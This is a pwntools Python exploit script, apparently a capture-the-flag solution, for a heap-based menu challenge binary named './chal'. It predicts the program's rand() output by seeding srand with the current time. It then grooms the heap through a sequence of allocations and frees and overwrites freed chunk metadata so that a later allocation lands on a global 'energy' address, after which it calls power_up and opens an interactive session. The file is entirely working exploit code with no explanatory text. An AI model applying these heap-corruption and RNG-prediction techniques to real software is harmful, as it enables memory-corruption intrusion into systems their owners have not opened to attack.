import ctypes
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal', '''
    continue
''')

def create_module(index, size, data):
    p.sendlineafter(b">> ", b'1')
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendlineafter(b"Data: ", data)

def delete_module(index):
    p.sendlineafter(b">> ", b'2')
    p.sendlineafter(b"Index: ", str(index).encode())

def edit_module(index, data):
    p.sendlineafter(b">> ", b'3')
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Data: ", data)

def power_up():
    p.sendlineafter(b">> ", b'4')

libc = ctypes.CDLL('libc.so.6')
libc.time.argtypes = [ctypes.POINTER(ctypes.c_long)]
libc.srand.argtypes = [ctypes.c_uint]
current_time = ctypes.c_long()
libc.time(ctypes.byref(current_time))
libc.srand(ctypes.c_uint(current_time.value))
libc.rand.restype = ctypes.c_int

for _ in range(9):
    libc.rand()

random_off = libc.rand()%256<<4
energy_addr = 0x4040c0

create_module(0, 0x1018, b'A'*8)
create_module(1, 0x2000+random_off-0x290-0x1020-8, b'B'*8)
create_module(2, 0x1008, b'C'*8)
create_module(3, 0x1ff8, b'D'*8)
delete_module(0)
create_module(4, 0x1ff8, b'E'*8)
delete_module(2)
edit_module(0, p64(0)*3+p64(energy_addr-0x20))
create_module(5, 0x1ff8, b'F'*8)
power_up()

p.interactive()